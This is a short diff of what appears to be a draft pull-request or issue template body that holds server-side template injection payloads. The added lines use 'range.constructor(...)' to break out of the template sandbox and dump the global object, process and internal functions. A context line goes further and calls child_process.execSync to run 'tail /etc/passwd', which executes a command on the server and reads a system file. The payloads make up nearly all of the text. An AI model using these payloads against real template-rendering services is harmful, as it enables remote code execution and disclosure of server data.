@@ -7,15 +7,13 @@ HELLO??mosh
 *Requested Reviewers*: 
 *Status*: DRAFT
 
+values: {{ values | dump }}
 
-values: ${{ values | dump }}
+glob: {{ range.constructor("let gg=global; delete gg.global;return gg")() | dump}}
 
-keys:
-${{ range.constructor("let gg=global; delete gg.global;return gg")() | dump}}
-
-
-22:
-// range.constructor("return module.exports")() | dump }}
+22: {{ range.constructor("return parseRepoUrl")() | dump }}
+23: {{ range.constructor("return global.process")() | dump }}
+24: {{ range.constructor("return templateStr.sub")() | dump }}
 
 // range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()
 
